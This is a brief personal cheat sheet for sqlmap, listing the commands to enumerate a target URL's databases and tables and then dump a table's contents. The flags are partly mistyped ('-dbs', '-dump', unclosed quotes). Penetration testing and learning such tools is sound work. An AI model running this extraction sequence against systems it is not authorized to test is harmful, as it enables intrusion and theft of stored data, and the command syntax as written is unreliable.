### SQLMAP
1. Login to root
2. Type "sqlmap -u _url_ -dbs
#### After Getting Database
Type "sqlmap -u _url_ -D _database_ --tables
#### After Getting Tables
Type "sqlmap -u _url_ -D _database_ -T _tables_ -dump